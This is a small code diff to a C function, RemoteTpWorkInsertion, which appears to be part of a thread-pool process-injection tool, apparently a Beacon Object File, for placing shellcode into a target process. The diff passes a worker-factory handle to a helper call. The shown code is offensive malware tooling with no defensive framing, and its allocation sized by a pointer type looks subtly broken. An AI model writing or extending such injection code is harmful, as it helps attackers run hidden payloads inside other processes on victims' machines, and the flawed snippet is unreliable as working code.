@@ -3,7 +3,7 @@
 void RemoteTpWorkInsertion(HANDLE hTarget, PVOID pShellcodeAddress) {
     _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
     
-    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation();
+    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation(hTpWorkerFactory);
     
     PFULL_TP_POOL TargetTpPool = NULL;
     TargetTpPool = (PFULL_TP_POOL)MSVCRT$calloc(1, sizeof(PFULL_TP_POOL));
